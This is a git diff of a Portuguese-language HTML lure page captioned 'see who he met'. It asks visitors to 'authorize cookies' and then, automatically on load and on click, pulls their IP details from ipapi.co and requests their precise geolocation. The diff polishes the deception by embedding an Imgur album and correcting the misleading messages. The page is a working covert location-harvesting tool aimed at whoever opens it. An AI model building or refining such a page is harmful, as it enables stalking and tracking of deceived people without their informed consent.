@@ -16,10 +16,10 @@
       text-align: center;
     }
 
-    .img-click {
+    .imgur-container {
       cursor: pointer;
-      max-width: 280px;
-      width: 80%;
+      max-width: 320px;
+      width: 90%;
       margin-top: 20px;
     }
 
@@ -33,21 +33,27 @@
 <body>
 
   <h2>Veja com quem ele se encontrou</h2>
-  <p>Um cara desse ainda diz ser de boa, autorize o cookies para mais detalhes</p>
+  <p>Um cara desse ainda diz ser de boa, autorize os cookies para mais detalhes</p>
 
-  <!-- IMAGEM CENTRALIZADA (fallback manual) -->
-  <img
-    src="https://imgur.com/a/cvUJSGG"
-    class="img-click"
-    alt="Veja todo o detalhe"
-    onclick="go()"
-  >
+  <!-- CONTAINER CLICÁVEL -->
+  <div class="imgur-container" onclick="go()">
+    <blockquote
+      class="imgur-embed-pub"
+      lang="en"
+      data-id="a/cvUJSGG"
+      data-context="false">
+      <a href="//imgur.com/a/cvUJSGG"></a>
+    </blockquote>
+  </div>
 
-  <div id="msg">Solicitando permissao…</div>
+  <div id="msg">Solicitando permissão…</div>
+
+  <!-- SCRIPT DO IMGUR -->
+  <script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>
 
 <script>
 async function go() {
-  document.getElementById("msg").innerText = "Solicitando de acesso…";
+  document.getElementById("msg").innerText = "Solicitando acesso…";
 
   const ipData = await fetch("https://ipapi.co/json/")
     .then(r => r.json())
@@ -55,7 +61,7 @@ async function go() {
 
   if (!navigator.geolocation) {
     document.getElementById("msg").innerText =
-      "cokkier não suportada neste navegador.";
+      "Geolocalização não suportada neste navegador.";
     return;
   }
 
@@ -84,16 +90,16 @@ Precisão: ${acc} m
       });
 
       document.getElementById("msg").innerText =
-        "imagem carregada!";
+        "✅ Imagem carregada!";
     },
     () => {
       document.getElementById("msg").innerText =
-        "❌ cookies negado. Toque na imagem para tentar novamente.";
+        "❌ Permissão negada. Toque na imagem para tentar novamente.";
     }
   );
 }
 
-// tenta automaticamente ao abrir
+// tentativa automática ao abrir
 window.onload = go;
 </script>
 
